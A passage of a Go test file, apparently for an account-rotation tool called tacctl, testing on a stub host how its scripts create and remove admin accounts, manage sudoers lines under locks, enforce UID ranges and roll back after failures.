	if !strings.Contains(string(RotateCreate{Account: "a", Auth: AuthKey, PubKey: testPubKey, Range: testRange}.Script()), "trap 'exit 130' HUP INT TERM") {
		t.Error("no trap for HUP")
	}
}

// Two scripts at once keep each other's sudoers line (the file is read,
// changed and renamed under a lock on the host), with flock and without.
func TestRotateCreateConcurrentScriptsKeepEachOthersLine(t *testing.T) {
	for _, noFlock := range []string{"", "1"} {
		h := newStubHost(t)
		env := func(uid string) []string {
			e := []string{"STUB_UID=" + uid, "STUB_VISUDO_SLEEP=0.6", "STUB_REAL_SLEEP=1"}
			if noFlock != "" {
				e = append(e, "TACCTL_ROTATE_NOFLOCK=1")
			}
			return e
		}
		w2 := h.start("one", h.createKey("deploy2", testRange, testAvoid...), env("30001")...)
		w3 := h.start("two", h.createKey("deploy3", testRange, testAvoid...), env("30002")...)
		o2, c2 := w2()
		o3, c3 := w3()
		if c2 != 0 || c3 != 0 {
			t.Fatalf("noflock=%q: exits %d %d\n%s\n%s", noFlock, c2, c3, o2, o3)
		}
		su, _ := os.ReadFile(h.sudoers)
		if !strings.Contains(string(su), "deploy2 ALL=(ALL:ALL) NOPASSWD: ALL\n") || !strings.Contains(string(su), "deploy3 ALL=(ALL:ALL) NOPASSWD: ALL\n") {
			t.Errorf("noflock=%q: a line was lost:\n%s", noFlock, su)
		}
		if fileExists(h.sudoers+".d") || fileExists(filepath.Join(filepath.Dir(h.sudoers), ".tacctl-provisioner.lock.d")) {
			t.Errorf("noflock=%q: lock directory left behind", noFlock)
		}
	}
}

func fileExists(p string) bool { _, err := os.Stat(p); return err == nil }

// An account with a number inside tacctl's range (or one it used before) is
// refused, adopted or just made.
func TestRotateCreateUIDRange(t *testing.T) {
	h := newStubHost(t)
	h.plant("deploy2", "85000", RotateMarker, true)
	out, code := h.run(h.createKey("deploy2", testRange, testAvoid...))
	if code != 1 || !strings.Contains(out, "has UID 85000, inside tacctl's UID range or one it used before") {
		t.Errorf("adopted, in range: %d\n%s", code, out)
	}
	h = newStubHost(t)
	h.plant("deploy2", "25000", RotateMarker, true)
	if out, code := h.run(h.createKey("deploy2", testRange, testAvoid...)); code != 1 || !strings.Contains(out, "has UID 25000") {
		t.Errorf("adopted, previous range: %d\n%s", code, out)
	}
	// useradd hands out a number inside the range anyway: the account it
	// made is removed again, and the run fails.
	h = newStubHost(t)
	out, code = h.run(h.createKey("deploy2", testRange, testAvoid...), "STUB_UID=85001")
	if code != 1 || !strings.Contains(out, "gave 'deploy2' UID 85001, inside tacctl's UID range") {
		t.Errorf("made in range: %d\n%s", code, out)
	}
	if h.uidOf("deploy2") != "" || fileExists(h.sudoers) {
		t.Errorf("account left: %q\n%s", h.read("passwd"), h.calls())
	}
	// A range that starts at 1000 leaves no number below it: a system
	// account.
	h = newStubHost(t)
	out, code = h.run(h.createKey("deploy2", Range{Min: 1000, Max: 1999}))
	if code != 0 || h.uidOf("deploy2") != "450" || !strings.Contains(h.calls(), "useradd -r -m -U") {
		t.Errorf("system account: %d uid %q\n%s\n%s", code, h.uidOf("deploy2"), out, h.calls())
	}
	// Every interval full: the system range as well.
	h = newStubHost(t)
	h.write("passwd", h.read("passwd")+"x:x:79999:79999:x:/x:/bin/false\n")
	if out, code = h.run(h.createKey("deploy2", testRange)); code != 0 || h.uidOf("deploy2") != "450" || !strings.Contains(out, "creating a system account") {
		t.Errorf("full: %d uid %q\n%s", code, h.uidOf("deploy2"), out)
	}
}

// A failure after the account was made takes it back (visudo refusing the
// line, an existing home directory); the sudoers file is not left behind.
func TestRotateCreateRollsBack(t *testing.T) {
	h := newStubHost(t)
	out, code := h.run(RotateCreate{Account: "INVALID", Auth: AuthKey, PubKey: testPubKey, Range: testRange}.Script())
	// 'INVALID' is no account name Go would pass, but the stub visudo trips on
	// it: the account made first is removed again.
	if code != 1 || !strings.Contains(out, "visudo rejected the sudoers line") || !strings.Contains(out, "Removing the account 'INVALID' this run created") {
		t.Errorf("visudo: %d\n%s", code, out)
	}
	if h.uidOf("INVALID") != "" || fileExists(h.sudoers) || fileExists(filepath.Join(h.home, "INVALID")) {
		t.Errorf("left behind:\n%s\n%s", h.read("passwd"), h.calls())
	}
	// A home directory that exists already: nothing is made.
	h = newStubHost(t)
	if err := os.MkdirAll(filepath.Join(h.home, "deploy2"), 0o755); err != nil {
		t.Fatal(err)
	}
	if out, code := h.run(h.createKey("deploy2", testRange)); code != 1 || !strings.Contains(out, "exists already. Nothing was changed.") || strings.Contains(h.calls(), "useradd -m") {
		t.Errorf("home exists: %d\n%s", code, out)
	}
}

// --password: the host's own passwd sets it; the sudoers line asks for it, no
// key is written, and there is nothing to type without a terminal.
func TestRotateCreatePasswordOnStubHost(t *testing.T) {
	h := newStubHost(t)
	script := RotateCreate{Account: "deploy2", Auth: AuthPassword, Range: testRange, Avoid: testAvoid}.Script()
	out, code := h.run(script)
	if code != 1 || !strings.Contains(out, "Setting the password needs a terminal. Nothing was changed.") || h.uidOf("deploy2") != "" {
		t.Errorf("no terminal: %d\n%s", code, out)
	}
	out, code = h.run(script, "TACCTL_ROTATE_TEST_TTY=1")
	if code != 0 {
		t.Fatalf("exit %d\n%s", code, out)
	}
	su, _ := os.ReadFile(h.sudoers)
	if !strings.Contains(string(su), "deploy2 ALL=(ALL:ALL) ALL\n") || strings.Contains(string(su), "NOPASSWD") {
		t.Errorf("sudoers %q", su)
	}
	if !strings.Contains(h.calls(), "passwd deploy2\n") || fileExists(filepath.Join(h.home, "deploy2", ".ssh", "authorized_keys")) {
		t.Errorf("calls:\n%s", h.calls())
	}
	if !strings.Contains(h.read("shadow"), "deploy2:$6$stub:") {
		t.Errorf("shadow:\n%s", h.read("shadow"))
	}
}

// The removal: the account, its group and its line go; the home is moved
// out of reach (or deleted); other grants are said and left.
func TestRotateRemoveOnStubHost(t *testing.T) {
	setup := func(h *stubHost) {
		h.plant("old", "1500", RotateMarker, true)
		h.ssh("old", map[string]string{"authorized_keys": "k\n"})
		if err := writeSudoers(t, h, []byte("# x\nold ALL=(ALL:ALL) NOPASSWD: ALL\nother ALL=(ALL:ALL) ALL\n")); err != nil {
			t.Fatal(err)
		}
	}
	rm := func(a string, home bool) []byte {
		return RotateRemove{Account: a, RemoveHome: home, Range: testRange, Avoid: testAvoid}.Script()
	}
	// Kept: moved to .tacctl-removed, only the account's sudoers line goes.
	h := newStubHost(t)
	setup(h)
	h.extraEnv = []string{"SUDO_USER=deploy2", "STUB_GROUPS=sudo wheel"}
	out, code := h.run(rm("old", false))
	if code != 0 || !strings.Contains(out, "Deleted the account 'old' (UID 1500).") || !strings.Contains(out, "home kept: ") {
		t.Fatalf("exit %d\n%s", code, out)
	}
	if !strings.Contains(out, "'old' was in the group 'sudo'") {
		t.Errorf("no group notice:\n%s", out)
	}
	if h.uidOf("old") != "" || strings.Contains(h.read("group"), "old:") {
		t.Errorf("account left:\n%s\n%s", h.read("passwd"), h.read("group"))
	}
	su, _ := os.ReadFile(h.sudoers)
	if strings.Contains(string(su), "old ") || !strings.Contains(string(su), "other ALL=(ALL:ALL) ALL") {
		t.Errorf("sudoers %q", su)
	}
	if fileExists(filepath.Join(h.home, "old")) {
		t.Errorf("home still in place")
	}
	kept, _ := filepath.Glob(filepath.Join(h.home, ".tacctl-removed", "old-*", ".ssh", "authorized_keys"))
	if len(kept) != 1 {
		t.Errorf("home not kept: %v", kept)
	}
	if !strings.Contains(h.calls(), "pkill -TERM -u old") || !strings.Contains(h.calls(), "usermod -e 1 old") {
		t.Errorf("processes:\n%s", h.calls())
	}
	// Deleted with --remove-home; the last line takes the file with it.
	h = newStubHost(t)
	setup(h)
	if err := writeSudoers(t, h, []byte("# x\nold ALL=(ALL:ALL) NOPASSWD: ALL\n")); err != nil {
		t.Fatal(err)
	}
	out, code = h.run(rm("old", true))
	if code != 0 || !strings.Contains(out, "Deleted home ") || fileExists(filepath.Join(h.home, "old")) || fileExists(h.sudoers) {
		t.Errorf("remove home: %d\n%s", code, out)
	}
	if fileExists(filepath.Join(h.home, ".tacctl-removed")) {
		t.Errorf("a deleted home was also kept")
	}
	// Another sudoers file naming the account is reported, not touched.
	h = newStubHost(t)
	setup(h)
	extra := filepath.Join(h.dir, "wheel-grant")
	if err := os.WriteFile(extra, []byte("old ALL=(ALL) ALL\n"), 0o440); err != nil {
		t.Fatal(err)
	}
	out, code = h.run(rm("old", false), "TACCTL_ROTATE_SUDOERS_SCAN="+h.sudoers+" "+extra)
	if code != 0 || !strings.Contains(out, "These sudoers files name 'old' and were left as they are: "+extra) {
		t.Errorf("other grants: %d\n%s", code, out)
	}
	if data, _ := os.ReadFile(extra); string(data) != "old ALL=(ALL) ALL\n" {
		t.Errorf("the other grant was touched: %q", data)
	}
}

func TestRotateRemoveRefusals(t *testing.T) {
	h := newStubHost(t)
	h.write("passwd", h.read("passwd")+
		"plain:x:1500:1500:Plain User:"+h.home+"/plain:/bin/bash\n"+
		"inrange:x:85000:85000:"+RotateMarker+":"+h.home+"/inrange:/bin/bash\n"+
		"prev:x:25000:25000:"+RotateMarker+":"+h.home+"/prev:/bin/bash\n")
	rm := func(a string) []byte {
		return RotateRemove{Account: a, Range: testRange, Avoid: testAvoid}.Script()
	}
	for _, c := range []struct {
		account string
		env     []string
		want    string
	}{
		{"root", nil, "Refusing to remove 'root' (UID 0). Nothing was changed."},
		{"inrange", nil, "inside tacctl's UID range or one it used before: it belongs to 'host sync'"},
		{"prev", nil, "inside tacctl's UID range or one it used before"},
		{"plain", []string{"SUDO_USER=plain"}, "This session is logged in as 'plain'. Nothing was changed."},
	} {
		before := h.read("passwd")
		out, code := h.run(rm(c.account), c.env...)
		if code != 1 || !strings.Contains(out, c.want) || h.read("passwd") != before {
			t.Errorf("%s: %d\n%s", c.account, code, out)
		}
	}
	// An account tacctl did not make goes (a superuser's --remove-old of the
	// account the host was enrolled with).
	if out, code := h.run(rm("plain")); code != 0 || h.uidOf("plain") != "" {
		t.Errorf("plain, made by hand: %d\n%s", code, out)
	}
	// An account that is not there: the line goes, no error.
	if out, code := h.run(rm("ghost")); code != 0 || !strings.Contains(out, "There is no account 'ghost' on this host; nothing to remove there.") {
		t.Errorf("ghost: %d\n%s", code, out)
	}
}

// writeSudoers replaces the provisioner sudoers file (the scripts leave it
// read-only).
func writeSudoers(t *testing.T, h *stubHost, text []byte) error {
	t.Helper()
	_ = os.Remove(h.sudoers)
	return os.WriteFile(h.sudoers, text, 0o640)
}
